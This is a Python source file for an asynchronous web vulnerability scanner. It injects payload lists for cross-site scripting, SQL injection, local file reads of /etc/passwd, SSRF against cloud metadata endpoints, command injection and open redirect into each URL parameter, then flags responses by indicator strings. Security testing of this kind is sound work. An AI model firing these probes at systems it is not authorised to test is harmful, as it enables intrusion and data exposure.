
import asyncio
import aiohttp
import re
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from typing import List, Dict, Any, Optional

class VulnerabilityScanner:
    def __init__(self, session: aiohttp.ClientSession, timeout: int = 10, verbose: bool = False):
        self.session = session
        self.timeout = timeout
        self.verbose = verbose
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self.headers = {"User-Agent": self.user_agent}
        
        # Payloads for different vulnerability types
        self.payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "'\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>"
            ],
            "sqli": [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "sleep(5)#",
                "'; WAITFOR DELAY '0:0:5'--"
            ],
            "lfi": [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd\0",
                "....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://metadata.google.internal/computeMetadata/v1/"
            ],
            "rce": [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami"
            ],
            "open_redirect": [
                "https://google.com",
                "//google.com",
                "/%09/google.com",
                "/%5cgoogle.com"
            ]
        }

    async def check_xss(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = url.split('?')[0]
        for param in params:
            for payload in self.payloads["xss"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        # Check for both raw and quoted payload in content
                        if payload in content or quote(payload) in content or quote(payload, safe='') in content:
                            findings.append({
                                "type": "XSS",
                                "url": str(resp.url),
                                "parameter": param,
                                "payload": payload,
                                "confidence": "High" if "<script>" in content or "onerror=" in content else "Medium"
                            })
                            print(f"Found XSS: {payload} in {resp.url}")
                except Exception as e:
                    if self.verbose: print(f"XSS Error: {e}")
                    continue
        return findings

    async def check_sqli(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = url.split('?')[0]
        sql_errors = [
            "SQL syntax", "mysql_fetch", "ORA-01756", "SQLite3::query", 
            "PostgreSQL query failed", "Microsoft OLE DB Provider for SQL Server"
        ]
        for param in params:
            for payload in self.payloads["sqli"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    # Time-based check
                    start_time = asyncio.get_event_loop().time()
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        end_time = asyncio.get_event_loop().time()
                        
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                findings.append({
                                    "type": "SQLi (Error-based)",
                                    "url": str(resp.url),
                                    "parameter": param,
                                    "payload": payload,
                                    "confidence": "High"
                                })
                                if self.verbose: print(f"Found SQLi: {error}")
                                break
                        
                        # Time-based check (if delay > 4s)
                        if end_time - start_time > 4:
                            findings.append({
                                "type": "SQLi (Time-based)",
                                "url": str(resp.url),
                                "parameter": param,
                                "payload": payload,
                                "confidence": "Medium"
                            })
                except Exception:
                    continue
        return findings

    async def check_lfi(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        lfi_indicators = ["root:x:0:0:", "[extensions]", "<?php", "DB_PASSWORD"]
        for param in params:
            for payload in self.payloads["lfi"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        for indicator in lfi_indicators:
                            if indicator in content:
                                findings.append({
                                    "type": "LFI",
                                    "url": str(resp.url),
                                    "parameter": param,
                                    "payload": payload,
                                    "confidence": "High"
                                })
                                break
                except Exception:
                    continue
        return findings

    async def check_ssrf(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        ssrf_indicators = ["ami-id", "instance-id", "SSH-2.0", "root:x:0:0:"]
        for param in params:
            for payload in self.payloads["ssrf"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        for indicator in ssrf_indicators:
                            if indicator in content:
                                findings.append({
                                    "type": "SSRF",
                                    "url": str(resp.url),
                                    "parameter": param,
                                    "payload": payload,
                                    "confidence": "High"
                                })
                                break
                except Exception:
                    continue
        return findings

    async def check_rce(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        rce_indicators = ["uid=", "gid=", "groups=", "www-data", "root"]
        for param in params:
            for payload in self.payloads["rce"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        for indicator in rce_indicators:
                            if indicator in content:
                                findings.append({
                                    "type": "RCE",
                                    "url": str(resp.url),
                                    "parameter": param,
                                    "payload": payload,
                                    "confidence": "High"
                                })
                                break
                except Exception:
                    continue
        return findings

    async def check_open_redirect(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = url.split('?')[0]
        for param in params:
            for payload in self.payloads["open_redirect"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False, allow_redirects=False) as resp:
                        if resp.status in [301, 302, 303, 307, 308]:
                            location = resp.headers.get("Location", "")
                            if "google.com" in location:
                                findings.append({
                                    "type": "Open Redirect",
                                    "url": str(resp.url),
                                    "parameter": param,
                                    "payload": payload,
                                    "confidence": "High"
                                })
                                print(f"Found Open Redirect: {payload} in {resp.url}")
                except Exception as e:
                    if self.verbose: print(f"Open Redirect Error: {e}")
                    continue
        return findings

    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        flat_params = {k: v[0] for k, v in params.items()}
        
        if self.verbose: print(f"Scanning {url} with params {flat_params}")
        
        if not flat_params:
            return []

        tasks = [
            self.check_xss(url, flat_params),
            self.check_sqli(url, flat_params),
            self.check_lfi(url, flat_params),
            self.check_ssrf(url, flat_params),
            self.check_rce(url, flat_params),
            self.check_open_redirect(url, flat_params)
        ]
        
        results = await asyncio.gather(*tasks)
        # Flatten the list of lists
        return [item for sublist in results for item in sublist]
